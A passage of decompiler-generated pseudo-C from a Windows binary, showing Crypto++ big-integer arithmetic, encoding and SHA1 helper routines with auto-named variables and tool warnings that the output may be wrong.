  if ( (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 128i64))(a2) < a3 )
  {
    sub_13F1053B0(v22, (const __m128i *)"Integer: input length is too small");
    sub_13F101600((__int64)pExceptionObject, v22);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  (*(void (__fastcall **)(__int64, char *))(*(_QWORD *)a2 + 168i64))(a2, v20);
  v8 = v20[0];
  v9 = a4 == 1 && v20[0] < 0;
  *(_DWORD *)(a1 + 40) = v9;
  if ( v5 )
  {
    while ( 1 )
    {
      v10 = 0;
      v11 = *(_DWORD *)(a1 + 40) ? v8 == -1 : v8 == 0;
      LOBYTE(v10) = v11;
      if ( !v10 )
        break;
      (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)a2 + 176i64))(a2, 1i64);
      (*(void (__fastcall **)(__int64, char *))(*(_QWORD *)a2 + 168i64))(a2, v20);
      if ( !--v5 )
        break;
      v8 = v20[0];
    }
  }
  v12 = sub_13F122180((v5 + 7) >> 3);
  sub_13F120E60((_QWORD *)(a1 + 8), v12);
  v13 = *(_QWORD *)(a1 + 32);
  if ( v13 )
    sub_13F15EF70(v13, 0, 8i64 * *(_QWORD *)(a1 + 24));
  result = 0x1FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a1 + 16) = 0x1FFFFFFFFFFFFFFFi64;
  if ( v5 )
  {
    v15 = v5 - 1;
    v16 = v5;
    do
    {
      (*(void (__fastcall **)(__int64, char *))(*(_QWORD *)a2 + 152i64))(a2, v20);
      v17 = (_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * (v15 >> 3));
      result = (unsigned __int64)(unsigned __int8)v20[0] << (8 * ((unsigned __int8)v15 & 7u));
      *v17 |= result;
      --v15;
      --v16;
    }
    while ( v16 );
  }
  if ( *(_DWORD *)(a1 + 40) == 1 )
  {
    for ( i = *(_QWORD *)(a1 + 24); v5 < 8 * i; i = *(_QWORD *)(a1 + 24) )
    {
      v19 = (_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * (v5 >> 3));
      *v19 |= 255i64 << (8 * ((unsigned __int8)v5++ & 7u));
    }
    return sub_13F123550(*(unsigned __int64 **)(a1 + 32), i);
  }
  return result;
}
// 13F11C820: using guessed type char var_A8[8];
// 13F11C820: using guessed type __m128i var_98[2];

//----- (000000013F11CA30) ----------------------------------------------------
__int64 __fastcall sub_13F11CA30(unsigned __int64 *a1, unsigned __int64 a2, __int64 a3)
{
  unsigned __int64 v3; // r9
  unsigned __int64 v5; // rax
  unsigned int v6; // er8
  __int64 v7; // r9
  unsigned __int64 v8; // rdx

  v3 = *a1;
  v5 = *a1 - a3;
  *a1 = v5;
  if ( v5 > v3 )
  {
    v6 = 1;
    if ( a2 <= 1 )
      return 1i64;
    v7 = 1i64;
    while ( 1 )
    {
      v8 = a1[v7];
      a1[v7] = v8 - 1;
      if ( v8 )
        break;
      v7 = ++v6;
      if ( v6 >= a2 )
        return 1i64;
    }
  }
  return 0i64;
}

//----- (000000013F11CA90) ----------------------------------------------------
__int64 __fastcall sub_13F11CA90(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rax
  __int64 result; // rax
  __int64 v6; // rbx
  unsigned __int64 v7; // rcx
  __int64 v8; // rdx
  char v9[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v10; // [rsp+38h] [rbp-30h]
  unsigned __int64 v11; // [rsp+40h] [rbp-28h]
  void *v12; // [rsp+48h] [rbp-20h]

  v4 = sub_13F113B00((__int64)v9, a2, a3);
  result = sub_13F113500(a1 + 72, v4);
  v6 = result;
  v7 = v11;
  if ( v10 < v11 )
    v7 = v10;
  v8 = (__int64)v12;
  if ( v12 )
  {
    memset(v12, 0, 8 * v7);
    sub_13F12E4D0(v8);
    return v6;
  }
  return result;
}
// 13F11CA90: using guessed type char var_40[16];

//----- (000000013F11CB10) ----------------------------------------------------
__m128i *__fastcall sub_13F11CB10(
        __m128i *a1,
        __int64 a2,
        _QWORD *a3,
        const __m128i *a4,
        __int64 a5,
        const __m128i *a6,
        unsigned __int64 a7)
{
  __int64 v7; // r14
  unsigned __int64 v8; // rbx
  const __m128i *v9; // r11
  __int64 v11; // r13
  unsigned __int64 *v12; // r15
  __int64 v13; // r10
  unsigned __int64 *v14; // r10
  unsigned __int64 v15; // r8
  unsigned int v16; // er12
  unsigned int v17; // edx
  unsigned int v18; // ecx
  unsigned __int64 v19; // r9
  unsigned __int64 i; // r8
  unsigned __int64 v21; // rax
  unsigned __int64 v22; // r9
  unsigned __int64 v23; // r9
  unsigned __int64 v24; // r8
  __int64 v25; // rax
  unsigned __int64 v26; // r9
  __int64 v27; // r11
  unsigned __int64 v28; // rdi
  unsigned __int64 v29; // rcx
  unsigned __int64 *v30; // rax
  unsigned __int64 v31; // rdx
  BOOL v32; // eax
  unsigned __int64 v33; // r8
  __int64 v34; // r13
  __m128i *v35; // r10
  unsigned __int64 *v36; // rdi
  unsigned __int64 v37; // r11
  __int64 v38; // r13
  unsigned __int64 v39; // rax
  unsigned __int64 v40; // rbp
  unsigned __int64 v41; // rdx
  _QWORD *v42; // rsi
  __int64 v43; // rbp
  bool v44; // zf
  __m128i *result; // rax
  char v46; // cl
  __int64 *v47; // r8
  unsigned __int64 v48; // rdx
  unsigned __int64 v49; // [rsp+30h] [rbp-88h]
  unsigned __int64 v50; // [rsp+38h] [rbp-80h]
  __m128i *v51; // [rsp+40h] [rbp-78h]
  unsigned __int64 v52; // [rsp+48h] [rbp-70h] BYREF
  unsigned __int64 v53[13]; // [rsp+50h] [rbp-68h] BYREF
  unsigned __int64 v56; // [rsp+C8h] [rbp+10h]
  __m128i *v57; // [rsp+D0h] [rbp+18h]
  unsigned int v59; // [rsp+D8h] [rbp+20h]
  unsigned __int64 v60; // [rsp+E0h] [rbp+28h]
  unsigned __int64 v61; // [rsp+F0h] [rbp+38h]

  v7 = 0i64;
  v8 = a7;
  v9 = a4;
  v11 = 0i64;
  v12 = &a3[a5 + 2];
  v50 = 8 * a7;
  v57 = (__m128i *)&a3[a7 + 2 + a5];
  v13 = a6->m128i_i64[a7 - 1];
  v12[a7 - 1] = 0i64;
  *v12 = 0i64;
  if ( !v13 )
    v11 = 1i64;
  if ( &v12[v11] != (unsigned __int64 *)a6 )
  {
    sub_13F10D330(
      (__m128i *)&v12[v11],
      8 * ((__PAIR128__(a7, v13) - 1) >> 64),
      a6,
      8 * ((__PAIR128__(a7, v13) - 1) >> 64));
    v9 = a4;
  }
  v14 = &v12[a7];
  v15 = *(v14 - 1);
  if ( v15 )
  {
    v17 = 0;
    v16 = 64;
    do
    {
      v18 = (v16 + v17) >> 1;
      if ( !(v15 >> v18) )
        v16 = (v16 + v17) >> 1;
      if ( !(v15 >> v18) )
        v18 = v17;
      v17 = v18;
    }
    while ( v16 - v18 > 1 );
  }
  else
  {
    v16 = 0;
  }
  v59 = 64 - v16;
  v19 = 0i64;
  if ( 64 != v16 )
  {
    for ( i = 0i64; i < a7; v19 = v22 >> v16 )
    {
      v21 = v19 | (v12[i] << (64 - (unsigned __int8)v16));
      v22 = v12[i];
      v12[i++] = v21;
    }
  }
  a3[a5 + 1] = 0i64;
  a3[a5] = 0i64;
  *a3 = 0i64;
  v51 = (__m128i *)&a3[v11];
  if ( &a3[v11] != (_QWORD *)v9 )
  {
    sub_13F10D330((__m128i *)&a3[v11], 8 * a5, v9, 8 * a5);
    v14 = &v12[a7];
  }
  v23 = 0i64;
  if ( v59 )
  {
    v24 = 0i64;
    if ( a5 != -2 )
    {
      do
      {
        v25 = v23 | (a3[v24] << v59);
        v26 = a3[v24];
        a3[v24++] = v25;
        v23 = v26 >> v16;
      }
      while ( v24 < a5 + 2 );
      v8 = a7;
    }
  }
  if ( *(_OWORD *)&a3[a5] <= 1ui64 )
  {
    v27 = a2;
    v28 = a5 - v8;
    *(_QWORD *)(v28 * 8 + a2) = 0i64;
    *(_QWORD *)(v28 * 8 + a2 + 8) = 0i64;
    while ( 1 )
    {
      if ( !a3[a5] )
      {
        v29 = v8;
        if ( v8 )
        {
          v30 = v14;
          do
          {
            v31 = *(unsigned __int64 *)((char *)v30-- + (char *)&a3[v28] - (char *)v12 - 8);
            --v29;
            if ( v31 > *v30 )
              break;
            if ( v31 < *v30 )
              goto LABEL_32;
          }
          while ( v29 );
        }
      }
      v32 = sub_13F13A520(v8, (__int64)&a3[v28], (__int64)&a3[v28], (__int64)v12);
      v27 = a2;
      v14 = &v12[a7];
      a3[a5] -= v32;
      ++*(_QWORD *)(v28 * 8 + a2);
    }
  }
  v27 = a2;
  a5 += 2i64;
LABEL_32:
  v49 = v12[v8 - 2] + 1;
  v33 = (v49 == 0) + *(v14 - 1);
  v34 = a5 - 2;
  v61 = v33;
  if ( a5 - 2 >= v8 )
  {
    v35 = v57;
    v36 = &a3[v34 + 1];
    v37 = v27 - v50 - (_QWORD)a3;
    v56 = v37;
    v38 = ((v34 - v8) >> 1) + 1;
    v60 = -8i64 - v50;
    do
    {
      v39 = *(v36 - 1);
      v40 = *v36;
      v41 = *(v36 - 2);
      if ( v33 || v49 )
      {
        v52 = *(v36 - 3);
        v53[0] = v41;
        v53[1] = v39;
        v53[2] = v40;
        v40 = sub_13F1121A0(v53, v49, v33);
        v39 = sub_13F1121A0(&v52, v49, v61);
        v37 = v56;
        v35 = v57;
      }
      v42 = (unsigned __int64 *)((char *)v36 + v37);
      *(unsigned __int64 *)((char *)v36 + v37 - 8) = v39;
      *(unsigned __int64 *)((char *)v36 + v37) = v40;
      sub_13F114E80(v35, &v35[1].m128i_i64[v8], (unsigned __int64 *)((char *)v36 + v37 - 8), 2ui64, v12, v8);
      v43 = (__int64)v36 + v60;
      sub_13F13A520(v8 + 2, (__int64)v36 + v60, (__int64)v36 + v60, (__int64)v57);
      while ( *(v36 - 1) || (int)sub_13F11C4E0(v43, (__int64)v12, v8) >= 0 )
      {
        *(v36 - 1) -= sub_13F13A520(v8, v43, v43, (__int64)v12);
        v44 = (*(v42 - 1))++ == -1i64;
        *v42 += v44;
      }
      v36 -= 2;
      v33 = v61;
      v37 = v56;
      v35 = v57;
      --v38;
    }
    while ( v38 );
  }
  result = a1;
  if ( a1 != v51 )
  {
    sub_13F10D330(a1, 8 * v8, v51, 8 * v8);
    result = a1;
  }
  v46 = 64 - v16;
  if ( v59 && v8 )
  {
    v47 = &result[-1].m128i_i64[v8 + 1];
    do
    {
      v48 = *v47--;
      result = (__m128i *)(v7 | (v48 >> v46));
      v7 = v48 << v16;
      v46 = 64 - v16;
      v47[1] = (__int64)result;
      --v8;
    }
    while ( v8 );
  }
  return result;
}

//----- (000000013F11CFD0) ----------------------------------------------------
__int64 __fastcall sub_13F11CFD0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 result; // rax
  int v9; // edx
  _QWORD *v10; // rcx
  __int64 v11; // rax
  _QWORD *v12; // rcx
  _QWORD *v13; // rcx
  _QWORD *v14; // rcx
  __int64 v15; // rax
  unsigned __int64 v16; // rcx
  __int64 v17; // rdx
  unsigned __int64 v18; // rcx
  __int64 v19; // rdx
  int v20; // edx
  _QWORD *v21; // rcx
  _QWORD *v22; // rcx
  char v23[16]; // [rsp+28h] [rbp-70h] BYREF
  unsigned __int64 v24; // [rsp+38h] [rbp-60h]
  unsigned __int64 v25; // [rsp+40h] [rbp-58h]
  void *v26; // [rsp+48h] [rbp-50h]
  int v27; // [rsp+50h] [rbp-48h]
  char v28[16]; // [rsp+58h] [rbp-40h] BYREF
  unsigned __int64 v29; // [rsp+68h] [rbp-30h]
  unsigned __int64 v30; // [rsp+70h] [rbp-28h]
  void *v31; // [rsp+78h] [rbp-20h]

  result = (__int64)sub_13F1211E0(a1, a2, a3, a4);
  if ( *(_DWORD *)(a3 + 40) == 1 )
  {
    v9 = *(_DWORD *)(a2 + 40);
    if ( v9 == 1 )
      goto LABEL_9;
    v10 = *(_QWORD **)(a2 + 32);
    if ( *v10 )
      goto LABEL_9;
    v11 = *(_QWORD *)(a2 + 24);
    if ( v11 )
    {
      v12 = &v10[v11 - 1];
      do
      {
        if ( *v12 )
          break;
        --v12;
        --v11;
      }
      while ( v11 );
    }
    if ( (_DWORD)v11 )
LABEL_9:
      *(_DWORD *)(a2 + 40) = 1 - v9;
    if ( *(_DWORD *)(a1 + 40) == 1 )
      goto LABEL_17;
    v13 = *(_QWORD **)(a1 + 32);
    if ( *v13 )
      goto LABEL_17;
    result = *(_QWORD *)(a1 + 24);
    if ( result )
    {
      v14 = &v13[result - 1];
      do
      {
        if ( *v14 )
          break;
        --v14;
        --result;
      }
      while ( result );
    }
    if ( (_DWORD)result )
    {
LABEL_17:
      sub_13F113780(a2);
      sub_13F112A00((__int64)v23, a4);
      v27 = 0;
      v15 = sub_13F113990((__int64)v28, (__int64)v23, a1);
      result = sub_13F113500(a1, v15);
      v16 = v30;
      if ( v29 < v30 )
        v16 = v29;
      v17 = (__int64)v31;
      if ( v31 )
      {
        memset(v31, 0, 8 * v16);
        result = sub_13F12E4D0(v17);
      }
      v18 = v25;
      if ( v24 < v25 )
        v18 = v24;
      v19 = (__int64)v26;
      if ( v26 )
      {
        memset(v26, 0, 8 * v18);
        result = sub_13F12E4D0(v19);
      }
    }
  }
  if ( *(_DWORD *)(a4 + 40) == 1 )
  {
    v20 = *(_DWORD *)(a2 + 40);
    if ( v20 == 1 )
      goto LABEL_33;
    v21 = *(_QWORD **)(a2 + 32);
    if ( *v21 )
      goto LABEL_33;
    result = *(_QWORD *)(a2 + 24);
    if ( result )
    {
      v22 = &v21[result - 1];
      do
      {
        if ( *v22 )
          break;
        --v22;
        --result;
      }
      while ( result );
    }
    if ( (_DWORD)result )
LABEL_33:
      *(_DWORD *)(a2 + 40) = 1 - v20;
  }
  return result;
}
// 13F11CFD0: using guessed type char var_40[16];

//----- (000000013F11D180) ----------------------------------------------------
__int64 __fastcall sub_13F11D180(__int64 *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v6; // rax

  v3 = *a1;
  v6 = (*(__int64 (__fastcall **)(__int64 *, __int64))(*a1 + 128))(a1, a3);
  return (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v3 + 120))(a1, a2, v6);
}

//----- (000000013F11D1C0) ----------------------------------------------------
void __fastcall sub_13F11D1C0(__m128i *a1, const __m128i *a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v8; // rdi
  __int64 v9; // r8
  __int64 v10; // r9
  __int64 *v11; // rax
  unsigned __int64 v12; // rdx
  __int64 v13; // rcx
  BOOL v14; // eax
  __int64 v15; // r8
  __int64 v16; // r10
  __int64 v17; // r9
  __int64 *v18; // rdx
  unsigned __int64 v19; // rcx
  __int64 v20; // rax

  if ( a1 != a2 )
    sub_13F10D330(a1, 8 * a5, a2, 8 * a5);
  if ( a3 )
  {
    v8 = a5;
    do
    {
      --a3;
      if ( (a1->m128i_i8[0] & 1) != 0 )
      {
        v14 = sub_13F13A4D0(a5, (__int64)a1, (__int64)a1, a4);
        v15 = 0i64;
        v16 = v14;
        v17 = a5;
        if ( a5 )
        {
          v18 = &a1[-1].m128i_i64[v8 + 1];
          do
          {
            v19 = *v18--;
            v20 = v15 | (v19 >> 1);
            v15 = v19 << 63;
            v18[1] = v20;
            --v17;
          }
          while ( v17 );
        }
        a1->m128i_i64[v8 - 1] += v16 << 63;
      }
      else
      {
        v9 = 0i64;
        v10 = a5;
        if ( a5 )
        {
          v11 = &a1->m128i_i64[a5 - 1];
          do
          {
            v12 = *v11--;
            v13 = v9 | (v12 >> 1);
            v9 = v12 << 63;
            v11[1] = v13;
            --v10;
          }
          while ( v10 );
        }
        v8 = a5;
      }
    }
    while ( a3 );
  }
}

//----- (000000013F11D2F0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F11D2F0(__int64 a1, __int64 a2, __int64 a3)
{
  _QWORD *v6; // rax
  __int64 v7; // rcx
  __int64 v8; // rdx
  __int64 (__fastcall **v10)(); // [rsp+30h] [rbp-48h] BYREF
  char v11[8]; // [rsp+38h] [rbp-40h] BYREF
  __m128i si128; // [rsp+40h] [rbp-38h]
  void *v13; // [rsp+50h] [rbp-28h]
  int v14; // [rsp+58h] [rbp-20h]

  v10 = off_13F185278;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AD0);
  v6 = (_QWORD *)sub_13F123740((__int64)v11, 2ui64);
  v13 = v6;
  v14 = 0;
  v6[1] = 0i64;
  *v6 = 0i64;
  *(_QWORD *)a2 = off_13F185278;
  *(_QWORD *)(a2 + 16) = 0x1FFFFFFFFFFFFFFFi64;
  *(_QWORD *)(a2 + 24) = 2i64;
  *(_QWORD *)(a2 + 32) = sub_13F123740(a2 + 8, 2ui64);
  *(_DWORD *)(a2 + 40) = 0;
  *(_QWORD *)(*(_QWORD *)(a2 + 32) + 8i64) = 0i64;
  **(_QWORD **)(a2 + 32) = 0i64;
  sub_13F11CFD0((__int64)&v10, a2, a1, a3);
  v7 = si128.m128i_i64[1];
  if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
    v7 = si128.m128i_i64[0];
  v8 = (__int64)v13;
  if ( v13 )
  {
    memset(v13, 0, 8 * v7);
    sub_13F12E4D0(v8);
  }
  return a2;
}
// 13F11D32D: write access to const memory at 13F1C4384 has been detected
// 13F11D37E: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185AD0: using guessed type __int128 xmmword_13F185AD0;
// 13F11D2F0: using guessed type char var_40[8];

//----- (000000013F11D430) ----------------------------------------------------
__int64 __fastcall sub_13F11D430(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  return sub_13F11CFD0(a2, a3, a4, a5);
}

//----- (000000013F11D450) ----------------------------------------------------
__int64 __fastcall sub_13F11D450(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v4; // rbx
  unsigned __int64 v5; // rcx
  __int64 v6; // rdx
  char v7[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v8; // [rsp+38h] [rbp-30h]
  unsigned __int64 v9; // [rsp+40h] [rbp-28h]
  void *v10; // [rsp+48h] [rbp-20h]

  sub_13F120ED0(a2, (__int64)v7, a2);
  result = sub_13F113500(a1 + 72, (__int64)v7);
  v4 = result;
  v5 = v9;
  if ( v8 < v9 )
    v5 = v8;
  v6 = (__int64)v10;
  if ( v10 )
  {
    memset(v10, 0, 8 * v5);
    sub_13F12E4D0(v6);
    return v4;
  }
  return result;
}

//----- (000000013F11D4D0) ----------------------------------------------------
__int64 __fastcall sub_13F11D4D0(__int64 a1, __int64 a2)
{
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 24i64))(a1, a2, a2);
}

//----- (000000013F11D4E0) ----------------------------------------------------
__int64 __fastcall sub_13F11D4E0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 136i64))(*(_QWORD *)(a1 + 8));
}

//----- (000000013F11D4F0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void **__fastcall sub_13F11D4F0(__int64 a1, __int64 a2, unsigned __int64 a3, int a4)
{
  void **result; // rax
  unsigned __int64 v5; // rsi
  unsigned __int64 v8; // rbx
  unsigned __int64 v9; // rbx
  __int64 v10; // rdi
  _QWORD *v11; // rax
  __int64 v12; // rax
  void *v13; // r15
  unsigned __int64 v14; // rcx
  unsigned __int64 v15; // rcx
  __int64 v16; // rdx
  unsigned __int64 v17; // rbx
  __int64 v18; // rax
  __int64 (__fastcall **v19)(); // [rsp+38h] [rbp-80h] BYREF
  __int64 v20; // [rsp+40h] [rbp-78h] BYREF
  unsigned __int64 v21; // [rsp+48h] [rbp-70h]
  unsigned __int64 v22; // [rsp+50h] [rbp-68h]
  _QWORD *v23; // [rsp+58h] [rbp-60h]
  int v24; // [rsp+60h] [rbp-58h]
  char v25[16]; // [rsp+68h] [rbp-50h] BYREF
  unsigned __int64 v26; // [rsp+78h] [rbp-40h]
  unsigned __int64 v27; // [rsp+80h] [rbp-38h]
  void *v28; // [rsp+88h] [rbp-30h]
  void *retaddr; // [rsp+B8h] [rbp+0h] BYREF
  int v30; // [rsp+D8h] [rbp+20h] BYREF

  result = &retaddr;
  v5 = a3;
  v30 = 0;
  if ( a4 && *(_DWORD *)(a1 + 40) == 1 )
  {
    v8 = (unsigned int)sub_13F11C050(a1);
    if ( v8 < v5 )
      v8 = v5;
    v9 = 8 * v8;
    v19 = off_13F185278;
    v10 = sub_13F122180((v9 + 64) >> 6);
    v21 = 0x1FFFFFFFFFFFFFFFi64;
    v22 = v10;
    v11 = (_QWORD *)sub_13F123740((__int64)&v20, v10);
    v23 = v11;
    v24 = 0;
    *v11 = 0i64;
    if ( v10 != 1 )
      memset(v11 + 1, 0, 8 * (v10 - 1));
    v30 = 1;
    v12 = sub_13F122180((v9 + 64) >> 6);
    sub_13F11C2E0(&v20, v12);
    v13 = v23;
    v23[v9 >> 6] |= 1i64 << (v9 & 0x3F);
    sub_13F120ED0((__int64)&v19, (__int64)v25, a1);
    v14 = v22;
    if ( v21 < v22 )
      v14 = v21;
    if ( v13 )
    {
      memset(v13, 0, 8 * v14);
      sub_13F12E4D0((__int64)v13);
    }
    result = sub_13F11D4F0((__int64)v25, a2, v5, 0);
    v15 = v27;
    if ( v26 < v27 )
      v15 = v26;
    v16 = (__int64)v28;
    if ( v28 )
    {
      memset(v28, 0, 8 * v15);
      return (void **)sub_13F12E4D0(v16);
    }
  }
  else if ( a3 )
  {
    v17 = a3 - 1;
    do
    {
      if ( v17 >> 3 >= *(_QWORD *)(a1 + 24) )
        LOBYTE(v18) = 0;
      else
        v18 = *(_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * (v17 >> 3)) >> (8 * ((unsigned __int8)v17 & 7u));
      LOBYTE(v30) = v18;
      result = (void **)(*(__int64 (__fastcall **)(__int64, int *, __int64))(*(_QWORD *)a2 + 48i64))(a2, &v30, 1i64);
      --v17;
      --v5;
    }
    while ( v5 );
  }
  return result;
}
// 13F11D557: write access to const memory at 13F1C4384 has been detected
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();

//----- (000000013F11D700) ----------------------------------------------------
void **__fastcall sub_13F11D700(__int64 a1, __int64 a2, unsigned __int64 a3, int a4)
{
  __int64 v9[6]; // [rsp+28h] [rbp-50h] BYREF

  sub_13F10EE30((__int64)v9, 0);
  v9[0] = (__int64)off_13F182988;
  v9[1] = (__int64)off_13F182AF8;
  v9[3] = a2;
  v9[4] = a3;
  v9[5] = 0i64;
  return sub_13F11D4F0(a1, (__int64)v9, a3, a4);
}
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];

//----- (000000013F11D7A0) ----------------------------------------------------
bool __fastcall sub_13F11D7A0(__int64 a1, __int64 a2, __int64 a3)
{
  int v3; // eax

  v3 = *(_DWORD *)(a3 + 40);
  if ( *(_DWORD *)(a2 + 40) == 1 )
  {
    if ( v3 != 1 )
      return 0;
  }
  else if ( v3 == 1 )
  {
    return 0;
  }
  return (unsigned int)sub_13F121140(a2, a3) == 0;
}

//----- (000000013F11D810) ----------------------------------------------------
__int64 __fastcall sub_13F11D810(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 8i64))(*(_QWORD *)(a1 + 8));
}

//----- (000000013F11D820) ----------------------------------------------------
__int64 __fastcall sub_13F11D820(__int64 a1, __int64 a2)
{
  _QWORD *v2; // rax

  if ( a2 )
  {
    v2 = (_QWORD *)(a1 + 8 * (a2 - 1));
    do
    {
      if ( *(v2 - 1) )
        break;
      if ( *v2 )
        break;
      v2 -= 2;
      a2 -= 2i64;
    }
    while ( a2 );
  }
  return a2;
}

//----- (000000013F11D850) ----------------------------------------------------
__int64 __fastcall sub_13F11D850(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rax
  unsigned __int64 v7; // rcx
  __int64 v8; // rdx
  unsigned __int64 v9; // rcx
  __int64 v10; // rdx
  __int64 v12[3]; // [rsp+30h] [rbp-88h] BYREF
  __int64 v13; // [rsp+48h] [rbp-70h] BYREF
  unsigned __int64 v14; // [rsp+58h] [rbp-60h]
  unsigned __int64 v15; // [rsp+60h] [rbp-58h]
  void *v16; // [rsp+68h] [rbp-50h]
  char v17[16]; // [rsp+78h] [rbp-40h] BYREF
  unsigned __int64 v18; // [rsp+88h] [rbp-30h]
  unsigned __int64 v19; // [rsp+90h] [rbp-28h]
  void *v20; // [rsp+98h] [rbp-20h]

  v12[1] = (__int64)&CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  v12[2] = (__int64)v12;
  sub_13F112CF0((__int64)&v13);
  v12[0] = (__int64)&CryptoPP::EuclideanDomainOf<CryptoPP::Integer>::`vftable';
  sub_13F112CF0((__int64)v17);
  v6 = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v12[0] + 200))(v12, a2, a3);
  sub_13F112A00(a1, v6);
  v7 = v19;
  if ( v18 < v19 )
    v7 = v18;
  v8 = (__int64)v20;
  if ( v20 )
  {
    memset(v20, 0, 8 * v7);
    sub_13F12E4D0(v8);
  }
  v9 = v15;
  if ( v14 < v15 )
    v9 = v14;
  v10 = (__int64)v16;
  if ( v16 )
  {
    memset(v16, 0, 8 * v9);
    sub_13F12E4D0(v10);
  }
  return a1;
}
// 13F1852F8: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 13F185968: using guessed type void *CryptoPP::EuclideanDomainOf<CryptoPP::Integer>::`vftable';
// 13F11D850: using guessed type __int64 var_88[3];
// 13F11D850: using guessed type char var_40[16];

//----- (000000013F11D960) ----------------------------------------------------
char *__fastcall sub_13F11D960(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int32 *v5; // rbx
  unsigned int v6; // edx
  unsigned __int32 v7; // eax
  __int64 v8; // rdi
  __int64 v9; // rcx
  int *v10; // rdi
  __int64 v11; // rcx
  char *result; // rax
  char *v13; // rdi
  __int64 v14[2]; // [rsp+58h] [rbp-100h] BYREF
  char v15[72]; // [rsp+68h] [rbp-F0h] BYREF
  __m128i si128; // [rsp+B0h] [rbp-A8h]
  char *v17; // [rsp+C0h] [rbp-98h]
  int v18[16]; // [rsp+C8h] [rbp-90h] BYREF
  char v19; // [rsp+109h] [rbp-4Fh]
  __m128i v20; // [rsp+110h] [rbp-48h]
  int *v21; // [rsp+120h] [rbp-38h]

  v5 = *(unsigned __int32 **)(a1 + 40);
  v6 = *(_DWORD *)(a1 + 8);
  v7 = _byteswap_ulong(v6);
  if ( v5 )
  {
    *v5 = v7;
    v6 = *(_DWORD *)(a1 + 8);
    v5 = *(unsigned __int32 **)(a1 + 40);
  }
  *(_DWORD *)(a1 + 8) = v6 + 1;
  v8 = *(_QWORD *)(a1 + 32);
  sub_13F10EE30((__int64)v14, 1);
  v14[1] = 0i64;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F185AE0);
  v15[65] = 1;
  v17 = v15;
  v20 = si128;
  v19 = 1;
  v21 = v18;
  sub_13F12F4B0(v18);
  v14[0] = (__int64)&CryptoPP::SHA1::`vftable';
  sub_13F10E240((__int64)v14, a2, a3, (__int64)v5, v8, 0i64, 0i64, 0, 1u);
  v9 = v20.m128i_i64[1];
  if ( v20.m128i_i64[0] < (unsigned __int64)v20.m128i_i64[1] )
    v9 = v20.m128i_i64[0];
  v10 = v21;
  if ( v21 == v18 )
  {
    while ( v9 )
    {
      *v10++ = 0;
      --v9;
    }
  }
  v11 = si128.m128i_i64[1];
  if ( si128.m128i_i64[0] < (unsigned __int64)si128.m128i_i64[1] )
    v11 = si128.m128i_i64[0];
  result = v15;
  v13 = v17;
  if ( v17 == v15 )
  {
    result = 0i64;
    while ( v11 )
    {
      *(_DWORD *)v13 = 0;
      v13 += 4;
      --v11;
    }
  }
  return result;
}
// 13F1856E0: using guessed type void *CryptoPP::SHA1::`vftable';
// 13F185AE0: using guessed type __int128 xmmword_13F185AE0;
// 13F11D960: using guessed type _DWORD var_90[16];

//----- (000000013F11DAE0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char __fastcall sub_13F11DAE0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r12
  int v5; // esi
  unsigned int v6; // er14
  _QWORD *v7; // rax
  unsigned __int64 v8; // r14
  __int64 v9; // rdi
  __m128i *v10; // rax
  __int64 v11; // rax
  __m128i *v12; // rbx
  unsigned __int64 v13; // r14
  unsigned __int64 v14; // rax
  __int64 *v15; // rcx
  __int64 v16; // rax
  __m128i *v17; // rdi
  int v18; // ecx
  int v19; // er15
  unsigned __int64 v20; // rax
  _QWORD *v21; // rcx
  __int64 v22; // rcx
  __int64 *v23; // rdx
  int v24; // edx
  __int64 v25; // rcx
  __int64 *v26; // rax
  unsigned __int64 v27; // rdx
  _QWORD *v28; // rax
  _QWORD *v29; // rax
  unsigned __int64 v30; // rax
  _QWORD *v31; // rcx
  __int64 v32; // rcx
  _QWORD *v33; // rdx
  int v34; // edx
  unsigned __int64 v35; // rax
  _QWORD *v36; // rcx
  __int64 v37; // rcx
  __int64 *v38; // rdx
  __int64 v39; // rcx
  __int64 *v40; // rax
  unsigned __int64 v41; // rdx
  __int64 v42; // rcx
  unsigned __int64 *v43; // rax
  unsigned __int64 v44; // rdx
  int v45; // edi
  __int64 v46; // rbx
  __int64 v47; // rax
  __int64 v48; // rax
  __int64 v49; // rax
  __int64 v50; // rax
  unsigned int v51; // ebx
